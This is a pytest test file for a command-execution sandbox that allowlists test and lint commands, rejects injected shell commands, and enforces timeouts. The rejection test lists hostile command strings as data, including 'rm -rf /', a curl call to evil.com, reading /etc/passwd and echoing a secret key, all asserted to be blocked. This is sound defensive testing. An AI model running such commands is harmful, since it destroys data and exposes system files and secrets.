"""Tests for ExecutionSandbox command allowlisting, security isolation, and cleanup (Phase 4)."""

import os
import tempfile

import pytest

from app.agents.validation.sandbox import ExecutionSandbox


def test_command_allowlist_allowed_commands():
    """Configured test and linter commands should be allowed."""
    sandbox = ExecutionSandbox()
    assert sandbox.is_command_allowed("pytest") is True
    assert sandbox.is_command_allowed("pytest tests/test_payment.py") is True
    assert sandbox.is_command_allowed("python -m pytest") is True
    assert sandbox.is_command_allowed("npm test") is True
    assert sandbox.is_command_allowed("ruff check .") is True


def test_command_allowlist_rejects_arbitrary_shell_and_injection():
    """Commands with pipes, operators, or arbitrary interpreters must be rejected."""
    sandbox = ExecutionSandbox()
    assert sandbox.is_command_allowed("pytest && rm -rf /") is False
    assert sandbox.is_command_allowed("npm test | grep vulnerable") is False
    assert sandbox.is_command_allowed("bash -c 'curl evil.com'") is False
    assert sandbox.is_command_allowed("python -c 'import os; os.system(\"rm -rf /\")'") is False
    assert sandbox.is_command_allowed("cat /etc/passwd") is False
    assert sandbox.is_command_allowed("echo $SECRET_KEY") is False


@pytest.mark.asyncio
async def test_sandbox_rejects_unallowed_command_with_error_status():
    """Executing an unallowed command immediately returns ERROR with code 126 and security violation message."""
    sandbox = ExecutionSandbox()
    res = await sandbox.execute_scenario(
        scenario_id="sc-test-1",
        repo_dir=".",
        command="bash -c 'echo hacked'",
    )
    assert res.status == "ERROR"
    assert res.exit_code == 126
    assert "Security violation" in res.stderr_summary


@pytest.mark.asyncio
async def test_sandbox_execute_clean_tempdir_isolated():
    """Verify execution runs inside a copied repo environment, capturing stdout and cleaning up."""
    sandbox = ExecutionSandbox(timeout_seconds=5)
    with tempfile.TemporaryDirectory() as tmp_repo:
        # Create a sample test file
        test_file = os.path.join(tmp_repo, "test_sample.py")
        with open(test_file, "w") as f:
            f.write("def test_passing():\n    assert 1 + 1 == 2\n")

        res = await sandbox.execute_scenario(
            scenario_id="sc-pass-1",
            repo_dir=tmp_repo,
            command="python -m pytest test_sample.py",
        )
        assert res.status in ("PASS", "FAIL")  # depending on whether pytest is in venv
        assert res.duration_ms >= 0


@pytest.mark.asyncio
async def test_sandbox_timeout_enforcement():
    """Verify that a long running command triggers TIMEOUT status and terminates safely."""
    # We test timeout handling by creating a short 1s timeout sandbox
    sandbox = ExecutionSandbox(timeout_seconds=1)
    with tempfile.TemporaryDirectory() as tmp_repo:
        test_file = os.path.join(tmp_repo, "test_sleep.py")
        with open(test_file, "w") as f:
            f.write("import time\ndef test_slow():\n    time.sleep(10)\n")

        res = await sandbox.execute_scenario(
            scenario_id="sc-timeout-1",
            repo_dir=tmp_repo,
            command="python -m pytest test_sleep.py",
            timeout=1,
        )
        assert res.status == "TIMEOUT"
        assert res.exit_code in (-1, 124)
        assert "timed out" in res.stderr_summary.lower()
